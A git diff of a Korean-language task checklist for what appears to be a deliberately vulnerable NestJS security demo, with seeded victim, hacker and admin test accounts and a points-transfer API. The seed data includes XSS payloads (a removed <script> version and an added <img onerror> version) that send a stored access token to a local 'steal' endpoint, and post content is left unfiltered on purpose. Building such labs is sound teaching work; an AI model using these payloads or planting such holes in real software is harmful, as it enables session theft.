@@ -45,8 +45,8 @@
 ## Phase 1: NestJS 서버 — DB 및 공통 모듈
 
 ### 1-1. TypeORM 설정
-- [ ] `app.module.ts`에 TypeORM 연결 (host: localhost, port: 5432)
-- [ ] `synchronize: true` (개발 환경)
+- [x] `app.module.ts`에 TypeORM 연결 (host: localhost, port: 5433)
+- [x] `synchronize: true` (개발 환경)
 
 ### 1-2. User 엔티티 정의
 ```typescript
@@ -60,30 +60,24 @@ export class User {
   @Column({ default: false })     isWithdrawn: boolean;
 }
 ```
-- [ ] `Role` enum: `USER | ADMIN`
+- [x] `Role` enum: `USER | ADMIN`
 
 ### 1-3. Post 엔티티 정의
-```typescript
-@Entity()
-export class Post {
-  @PrimaryGeneratedColumn()    id: number;
-  @Column()                    title: string;
-  @Column('text')              content: string;  // XSS 스크립트 저장됨 (의도적)
-  @ManyToOne(() => User)       author: User;
-}
-```
+- [x] `entities/post.entity.ts` — content 필터 없음 (XSS 취약점 의도적 설계)
 
 ### 1-4. Seed 데이터
-- [ ] `SeedService` 또는 `OnModuleInit` 훅으로 서버 시작 시 자동 삽입
-  - `victim@test.com` / `victim1234` / points: 1,000,000
-  - `hacker@test.com` / `hacker1234` / points: 0
-  - `admin@test.com` / `admin1234` / points: 0
-  - XSS 게시글: 제목 "초특가 세일!", 내용 `<script>fetch('http://localhost:4999/steal?t=' + localStorage.getItem('at'))</script>`
+- [x] `SeedService` (OnModuleInit) — 서버 시작 시 자동 삽입
+  - `victim@test.com` / `victim1234` / points: 1,000,000 ✅
+  - `hacker@test.com` / `hacker1234` / points: 0 ✅
+  - `admin@test.com`  / `admin1234`  / points: 0 ✅
+  - XSS 게시글: `<img onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">` ✅
 
 ### 1-5. 공통 API 모듈
-- [ ] `PostsModule` — 게시글 CRUD (`GET /api/posts`, `POST /api/posts`)
-- [ ] `PointsModule` — 포인트 송금 (`POST /api/points/transfer`)
-- [ ] `UserModule` — 비밀번호 변경, 회원 탈퇴
+- [x] `PostsModule` — `GET /api/posts`, `POST /api/posts`
+- [x] `PointsModule` — `POST /api/points/transfer` (V1 JWT Bearer 인증)
+- [x] `UsersModule` — `POST /api/user/update-password`, `GET /api/user/withdraw`, `GET /api/user/me`
+- [x] `main.ts` — ValidationPipe, cookieParser, express-session, CORS 설정
+- [x] Docker: postgres:5433, pgAdmin:5050 실행 확인
 
 ---
 
